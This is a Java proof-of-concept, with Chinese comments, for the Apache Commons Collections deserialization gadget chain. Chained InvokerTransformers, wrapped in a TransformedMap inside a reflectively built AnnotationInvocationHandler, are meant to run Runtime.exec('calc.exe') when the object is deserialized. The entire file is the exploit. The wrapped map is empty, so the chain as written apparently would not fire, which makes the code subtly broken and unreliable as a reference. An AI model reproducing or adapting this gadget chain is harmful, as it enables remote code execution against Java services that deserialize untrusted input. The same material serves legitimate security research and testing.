import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.HashedMap;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Constructor;
import java.util.Map;
import java.io.*;


public class CommonCollectionsPlayLoad {

    public static void main(String[] args) throws Exception {
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
        new CommonCollectionsPlayLoad().run();
    }

    public void run() throws Exception {
        deserialize(serialize(getObject()));
    }

    //在此方法中返回恶意对象
    public Object getObject() throws Exception {
        //构建恶意代码
        String command = "calc.exe";
        final String[] execArgs = new String[]{command};
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, execArgs)
        };
        Transformer transformer = new ChainedTransformer(transformers);

        //将恶意代码包装到目标的 sun.reflect.annotation.AnnotationInvocationHandler 中
        /**
         * 构建一个 transformedMap ,
         * transformedMap的作用是包装一个Map对象,使得每一次在该Map中的Entry进行setValue的时候
         * 都会触发 transformer的transform()方法
         * */
        Map transformedMap = TransformedMap.decorate(new HashedMap(), null, transformer);
        //由于AnnotationInvocationHandler无法直接访问,因此使用反射的方式来构建对象
        final Constructor<?> constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        return constructor.newInstance(Override.class, transformedMap);
    }

    public byte[] serialize(final Object obj) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        return out.toByteArray();
    }

    public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
        ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }
}